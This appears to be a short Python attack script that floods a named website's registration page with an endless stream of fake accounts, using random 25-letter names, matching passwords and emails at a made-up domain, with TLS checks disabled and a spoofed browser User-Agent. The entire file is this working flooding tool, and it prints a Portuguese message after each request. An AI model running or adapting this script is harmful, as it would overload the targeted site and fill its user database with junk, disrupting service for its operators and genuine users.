import requests
from random import choice
from string import ascii_lowercase

url = 'https://www.minemarket.com.br/register/'

lis=list(ascii_lowercase)

while(1):
    ii = ''.join(choice(lis) for _ in range(25))
    r = requests.post(url, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=False, verify=False, data={
        'name': ii,
        'mail': ii+'@wh1t30wn4.c0m',
        'pass': ii,
        'register': ''
    })
    print("Pacote enviado com sucesso: %s"%ii);
